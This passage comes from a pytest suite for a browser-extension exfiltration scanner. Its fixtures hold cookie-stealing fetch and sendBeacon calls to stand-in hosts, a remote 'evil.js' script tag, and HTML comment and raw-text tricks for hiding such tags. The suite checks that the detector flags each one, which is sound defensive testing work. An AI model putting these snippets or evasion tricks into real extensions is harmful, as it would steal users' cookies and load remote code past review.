    "s.setAttribute('src', 'node_modules/x/p.js');",
    "chrome.action.setPopup({popup: 'node_modules/x/p.html'});",
    "location.href = 'node_modules/x/p.html';",
    "window.open('node_modules/x/p.html');",
    "chrome.devtools.panels.create('t', 'i.png', 'node_modules/x/p.html');",
    "document.write('<script src=\"node_modules/x/p.js\"></scr' + 'ipt>');",
])
def test_h3_more_reference_forms_reach_vendored_code(tmp_path, loader):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(background={"service_worker": "sw.js"}),
        "sw.js": loader + "\n",
        "node_modules/x/p.js": "fetch('https://hidden.example.org/x', {body: document.cookie});\n",
        "node_modules/x/p.html": '<script src="p.js"></script>',
    })
    assert "hidden.example.org" in {h["host"] for h in ext_exfil.analyze(ext)["hosts"]}, loader


def test_cap_keeps_a_new_host_after_many_dynamic_calls(tmp_path):
    text = "fetch(x);\n" * 2001 + "navigator.sendBeacon('https://collect.example.net/b', document.cookie);\n"
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "m.js": text})
    found = ids(ext_exfil.analyze(ext)["findings"])
    assert {"exfil.sensitive-source-to-external-sink", "exfil.beacon-or-pixel"} <= found
    assert "analysis.incomplete-coverage" not in found


def test_many_literals_to_one_host_are_not_incomplete(tmp_path):
    text = "".join(f"var l{i} = 'https://docs.example.org/p{i}';\n" for i in range(2100))
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "b.js": text})
    report = ext_exfil.analyze(ext)
    assert "analysis.incomplete-coverage" not in ids(report["findings"])
    assert not ext_exfil.has_failing_findings(report)


def test_coverage_gap_cannot_be_forged_by_a_file_name(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(background={"service_worker": "NOT scanned larger than.js"})})
    report = ext_exfil.analyze(ext)
    assert any("NOT scanned larger than.js" in lim for lim in report["limitations"])
    assert "analysis.incomplete-coverage" not in ids(report["findings"])


# =================================================================================================
# Final review pass: the comment/raw-text masking must never hide a tag the plain scan sees, and
# must never crash. scan_source merges a masked and a raw tag pass.
# =================================================================================================

R_TAG = '<script src="https://cdn.example.net/evil.js"></script>'
DOTTED_I = chr(0x130)


@pytest.mark.parametrize("html_text", [
    "<!-->" + R_TAG + "<!-- -->",                                       # empty comment
    "<!--->" + R_TAG + "<!-- -->",
    "<!-- x --!>" + R_TAG + "<!-- -->",                                 # --!> comment end
    "<script-x>" + R_TAG,                                               # custom element names
    "<style-x>" + R_TAG + "</style>",
    "<title-x>" + R_TAG + "</title>",
    '<iframe><img title="</iframe>' + R_TAG + '<iframe>"</iframe>',     # more raw-text elements
    '<noembed><img title="</noembed>' + R_TAG + '<noembed>"</noembed>',
    '<noframes><img title="</noframes>' + R_TAG + '<noframes>"</noframes>',
    DOTTED_I * 100 + "<!--" + " " * 200 + "-->" + R_TAG,                # lower() length change
    "<svg><title>" + R_TAG + "</title></svg>",
    DOTTED_I + "<script>x</script>" + R_TAG,                            # used to raise AttributeError
])
def test_masking_never_hides_a_remote_script(tmp_path, capsys, html_text):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(action={"default_popup": "popup.html"}),
                                        "popup.html": html_text})
    report = ext_exfil.analyze(ext)
    assert "html-script" in host(report, "cdn.example.net")["kinds"]
    assert "exfil.remote-code" in ids(report["findings"])
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()
